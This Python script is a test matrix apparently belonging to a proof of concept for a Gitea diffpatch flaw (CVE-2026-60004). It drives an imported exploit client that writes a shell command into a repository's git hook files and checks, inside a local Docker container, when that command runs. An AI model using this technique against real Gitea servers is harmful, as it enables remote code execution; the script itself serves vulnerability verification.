#!/usr/bin/env python3
import sys
from typing import NamedTuple

import requests
from exploit import (
    DEFAULT_CONTAINER,
    TARGET_HOOK_PATH,
    GiteaExploit,
    check_container_running,
    docker_exec,
    get_parser,
)


class TestCase(NamedTuple):
    case_id: str
    title: str
    target_file: str
    repeat: int
    expected_statuses: tuple
    expected_executed: bool


class TestResult(NamedTuple):
    case: TestCase
    statuses: list
    executed: bool

    @property
    def passed(self) -> bool:
        return (
            tuple(self.statuses) == self.case.expected_statuses
            and self.executed == self.case.expected_executed
        )


TEST_CASES = (
    TestCase("1", "Single Patch Isolation", TARGET_HOOK_PATH, 1, (201,), False),
    TestCase("2", "Pre-existing File Vector", "config", 2, (201, 500), False),
    TestCase("3", "Inapplicable Lifecycle Hook", "hooks/pre-commit", 2, (201, 201), False),
    TestCase("4", "Target Exploit Condition", TARGET_HOOK_PATH, 2, (201, 201), True),
)


def run_case(client: GiteaExploit, base_branch: str, container: str, case: TestCase) -> TestResult:
    branch = f"branch_c{case.case_id}"
    marker = f"/tmp/m_case{case.case_id}.txt"

    print(f"\n[*] [Test Case {case.case_id}] {case.title} ({case.target_file}, {case.repeat}x)")
    docker_exec(container, "rm", "-f", marker)
    client.create_branch(branch, base_branch)

    statuses = []
    executed = False
    try:
        patch = client.build_patch(f"touch {marker}", filepath=case.target_file)
        for _ in range(case.repeat):
            resp = client.apply_diffpatch(branch, patch)
            statuses.append(resp.status_code)
        executed = docker_exec(container, "test", "-f", marker).returncode == 0
    finally:
        docker_exec(container, "rm", "-f", marker)
        client.delete_branch(branch)

    result = TestResult(case, statuses, executed)
    print(
        f"    HTTP: {statuses} | "
        f"Execution: {'[+] SUCCESS' if executed else '[-] FAILED'} | "
        f"Boundary: {'[+] PASS' if result.passed else '[-] UNEXPECTED'}"
    )
    return result


def print_summary(results: list[TestResult]) -> None:
    print("\n" + "=" * 80)
    print("ARCHITECTURAL MATRIX SUMMARY")
    print("=" * 80)
    fmt = "{:<4} | {:<28} | {:<24} | {:<6} | {:<12} | {:<9}"
    print(fmt.format("Case", "Test Condition", "Target Path", "Repeat", "HTTP", "Execution"))
    print("-" * 80)
    for res in results:
        execution = "SUCCESS" if res.executed else "FAILED"
        statuses_str = ",".join(str(code) for code in res.statuses)
        print(
            fmt.format(
                res.case.case_id,
                res.case.title,
                res.case.target_file,
                f"{res.case.repeat}x",
                f"[{statuses_str}]",
                execution,
            )
        )
    print("=" * 80)


def main():
    parser = get_parser("CVE-2026-60004 Architectural Boundary & Mechanism Matrix")
    parser.add_argument(
        "--container",
        default=DEFAULT_CONTAINER,
        help=f"Target container name (default: {DEFAULT_CONTAINER})",
    )
    args = parser.parse_args()

    if not check_container_running(args.container):
        print(f"[-] Error: Target container '{args.container}' is not running.")
        sys.exit(1)

    cleanup_paths = tuple(c.target_file for c in TEST_CASES)

    try:
        with GiteaExploit(args.url, args.username, args.password, args.repo) as client:
            base_branch = client.prepare_workspace(cleanup_paths=cleanup_paths)
            print("=" * 80)
            print(f"CVE-2026-60004 Architectural Matrix ({client.base_url})")
            print(f"User: {client.username} | Repo: {client.repo}")
            print("=" * 80)

            results = [
                run_case(client, base_branch, args.container, case) for case in TEST_CASES
            ]
            print_summary(results)

            if not all(r.passed for r in results):
                print("[-] Error: One or more matrix boundary conditions did not match expectations.")
                sys.exit(1)
            print("[+] All architectural boundary checks passed successfully.")
    except Exception as exc:
        print(f"[-] Matrix testing failed: {exc}")
        sys.exit(1)


if __name__ == "__main__":
    main()
